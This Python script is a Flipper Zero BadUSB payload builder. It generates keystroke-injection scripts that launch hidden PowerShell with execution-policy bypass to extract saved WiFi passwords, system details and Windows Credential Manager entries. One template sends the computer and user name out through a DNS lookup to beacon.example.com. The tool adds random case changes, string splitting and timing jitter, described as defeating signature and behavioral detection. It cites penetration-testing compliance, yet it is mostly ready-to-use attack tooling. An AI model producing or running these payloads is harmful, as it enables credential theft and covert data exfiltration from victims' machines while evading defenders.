#!/usr/bin/env python3
"""
FLLC Flipper Zero BadUSB Payload Builder
==========================================
Generates polymorphic BadUSB payloads with anti-AI evasion.

Features:
  - Template-based payload generation
  - Polymorphic delay randomization (defeats behavioral AI timing analysis)
  - Keystroke timing variation (defeats keystroke dynamics profiling)
  - Variable string obfuscation (defeats signature-based detection)
  - Multi-OS targeting (Windows, macOS, Linux)
  - Output in Flipper BadUSB DuckyScript format

Compliance: NIST CA-8 (Penetration Testing)
FLLC 2026 — FU PERSON by PERSON FU
"""

import os
import sys
import random
import string
import argparse
from datetime import datetime

# =========================================================================
# PAYLOAD TEMPLATES
# =========================================================================

TEMPLATES = {
    "wifi_grab": {
        "name": "WiFi Password Extractor",
        "os": "windows",
        "description": "Extracts all saved WiFi passwords to a file",
        "base_commands": [
            ("GUI r", "Open Run dialog"),
            ("DELAY {delay_short}", "Wait for dialog"),
            ("STRING powershell -NoP -W Hidden -Exec Bypass -C \"", "Start PS hidden"),
            ("STRING $r=@();", "Init results array"),
            ("STRING (netsh wlan show profiles)|%%{{if($_ -match 'Profile\\s*:\\s*(.+)$'){{", "Loop profiles"),
            ("STRING $n=$matches[1].Trim();$p=(netsh wlan show profile $n key=clear)|", "Get profile key"),
            ("STRING %%{{if($_ -match 'Key Content\\s*:\\s*(.+)$'){{$matches[1]}}}};", "Extract password"),
            ("STRING $r+=$n+':'+$p}}}};", "Build result"),
            ("STRING $r|Out-File $env:TEMP\\w.txt;", "Write to file"),
            ("STRING notepad $env:TEMP\\w.txt\"", "Open results"),
            ("ENTER", "Execute"),
        ],
    },
    "sysinfo": {
        "name": "System Information Dump",
        "os": "windows",
        "description": "Collects comprehensive system information",
        "base_commands": [
            ("GUI r", "Open Run dialog"),
            ("DELAY {delay_short}", "Wait"),
            ("STRING powershell -NoP -W Hidden -Exec Bypass -C \"", "Start PS hidden"),
            ("STRING $o=@('=== SYSTEM INFO ===');", "Header"),
            ("STRING $o+=systeminfo;$o+=whoami /all;", "System + user info"),
            ("STRING $o+=ipconfig /all;$o+=netstat -an;", "Network config"),
            ("STRING $o+=Get-Process|Format-Table -Auto;", "Running processes"),
            ("STRING $o+=Get-Service|Where Status -eq Running;", "Running services"),
            ("STRING $o|Out-File $env:TEMP\\s.txt;notepad $env:TEMP\\s.txt\"", "Save and open"),
            ("ENTER", "Execute"),
        ],
    },
    "reverse_beacon": {
        "name": "Reverse Beacon (DNS)",
        "os": "windows",
        "description": "Sends system identifier via DNS query (stealthy exfil)",
        "base_commands": [
            ("GUI r", "Open Run dialog"),
            ("DELAY {delay_short}", "Wait"),
            ("STRING powershell -NoP -W Hidden -Exec Bypass -C \"", "Start PS hidden"),
            ("STRING $h=$env:COMPUTERNAME+'.'+$env:USERNAME;", "Build hostname tag"),
            ("STRING $h=$h-replace'[^a-zA-Z0-9]','-';", "Sanitize for DNS"),
            ("STRING Resolve-DnsName ($h+'.beacon.example.com') -ErrorAction SilentlyContinue\"", "DNS beacon"),
            ("ENTER", "Execute"),
        ],
    },
    "credential_dump": {
        "name": "Credential Harvester",
        "os": "windows",
        "description": "Extracts stored credentials from Windows Credential Manager",
        "base_commands": [
            ("GUI r", "Open Run dialog"),
            ("DELAY {delay_short}", "Wait"),
            ("STRING powershell -NoP -W Hidden -Exec Bypass -C \"", "Start PS hidden"),
            ("STRING $r=@();", "Init"),
            ("STRING cmdkey /list|%%{{$r+=$_}};", "List stored creds"),
            ("STRING $r+='-'*40;", "Separator"),
            ("STRING $r+=(Get-StoredCredential -ErrorAction SilentlyContinue|Format-List);", "PS creds"),
            ("STRING $r|Out-File $env:TEMP\\c.txt;notepad $env:TEMP\\c.txt\"", "Save"),
            ("ENTER", "Execute"),
        ],
    },
}


def random_delay(base_ms, jitter_percent=50):
    """Generate a randomized delay with jitter to defeat timing analysis."""
    jitter = base_ms * (jitter_percent / 100)
    return max(50, int(base_ms + random.uniform(-jitter, jitter)))


def obfuscate_string(s, level=1):
    """Obfuscate a string command for signature evasion.
    Level 0: No obfuscation
    Level 1: Random case variation for non-critical chars
    Level 2: String concatenation splitting
    """
    if level == 0:
        return s
    elif level == 1:
        # Random case for non-syntax characters
        result = []
        for c in s:
            if c.isalpha() and random.random() < 0.3:
                result.append(c.swapcase())
            else:
                result.append(c)
        return "".join(result)
    elif level == 2:
        # Split string into concatenated parts (PowerShell)
        if len(s) < 10:
            return s
        parts = []
        i = 0
        while i < len(s):
            chunk_len = random.randint(3, 8)
            parts.append(s[i : i + chunk_len])
            i += chunk_len
        return "+".join(f"'{p}'" for p in parts)
    return s


def build_payload(template_name, obfuscation_level=1, delay_base=500):
    """Build a polymorphic BadUSB payload from a template."""
    if template_name not in TEMPLATES:
        print(f"[!] Unknown template: {template_name}")
        print(f"    Available: {', '.join(TEMPLATES.keys())}")
        return None

    tmpl = TEMPLATES[template_name]
    lines = []

    # Header
    lines.append(f"REM === FLLC Payload: {tmpl['name']} ===")
    lines.append(f"REM Generated: {datetime.now().isoformat()}")
    lines.append(f"REM Target OS: {tmpl['os']}")
    lines.append(f"REM Obfuscation: Level {obfuscation_level}")
    lines.append(f"REM Anti-AI: Polymorphic delays + timing jitter")
    lines.append("REM FLLC 2026 - FU PERSON")
    lines.append("")

    # Initial delay (randomized)
    lines.append(f"DELAY {random_delay(1000)}")
    lines.append("")

    # Build commands with jitter
    for cmd, comment in tmpl["base_commands"]:
        # Replace delay placeholders
        if "{delay_short}" in cmd:
            cmd = cmd.replace("{delay_short}", str(random_delay(delay_base)))
        elif "{delay_long}" in cmd:
            cmd = cmd.replace("{delay_long}", str(random_delay(delay_base * 3)))

        # Apply obfuscation to STRING commands
        if cmd.startswith("STRING ") and obfuscation_level > 0:
            prefix = "STRING "
            payload = cmd[len(prefix) :]
            payload = obfuscate_string(payload, obfuscation_level)
            cmd = prefix + payload

        lines.append(f"REM {comment}")
        lines.append(cmd)

        # Add micro-jitter between keystrokes (defeats behavioral analysis)
        if not cmd.startswith("REM") and not cmd.startswith("DELAY"):
            jitter = random_delay(100, 80)
            if jitter > 50:
                lines.append(f"DELAY {jitter}")

    return "\n".join(lines)


def main():
    parser = argparse.ArgumentParser(
        description="FLLC BadUSB Payload Builder v2026",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Templates:
  wifi_grab        Extract saved WiFi passwords
  sysinfo          System information dump
  reverse_beacon   DNS-based reverse beacon
  credential_dump  Windows Credential Manager harvest

Examples:
  python payload_builder.py wifi_grab -o wifi.txt
  python payload_builder.py sysinfo --obfuscation 2 --delay 300
  python payload_builder.py --list
        """,
    )

    parser.add_argument("template", nargs="?", help="Payload template name")
    parser.add_argument("-o", "--output", help="Output file path")
    parser.add_argument(
        "--obfuscation",
        type=int,
        default=1,
        choices=[0, 1, 2],
        help="Obfuscation level (0=none, 1=case, 2=split)",
    )
    parser.add_argument(
        "--delay", type=int, default=500, help="Base delay in ms (default: 500)"
    )
    parser.add_argument(
        "--list", action="store_true", help="List available templates"
    )
    parser.add_argument(
        "--variants",
        type=int,
        default=1,
        help="Generate N polymorphic variants",
    )

    args = parser.parse_args()

    print("=" * 50)
    print("  FLLC BadUSB Payload Builder v2026")
    print("  Anti-AI Evasion | Polymorphic Output")
    print("=" * 50)

    if args.list or not args.template:
        print("\nAvailable Templates:")
        for name, tmpl in TEMPLATES.items():
            print(f"  {name:20s} [{tmpl['os']:>7s}] {tmpl['description']}")
        return

    for i in range(args.variants):
        payload = build_payload(args.template, args.obfuscation, args.delay)
        if payload is None:
            return

        if args.output:
            if args.variants > 1:
                base, ext = os.path.splitext(args.output)
                out_path = f"{base}_v{i+1}{ext}"
            else:
                out_path = args.output

            with open(out_path, "w") as f:
                f.write(payload)
            print(f"\n[+] Saved: {out_path}")
        else:
            print(f"\n--- Variant #{i+1} ---")
            print(payload)

    if args.variants > 1:
        print(f"\n[+] Generated {args.variants} polymorphic variants.")


if __name__ == "__main__":
    main()
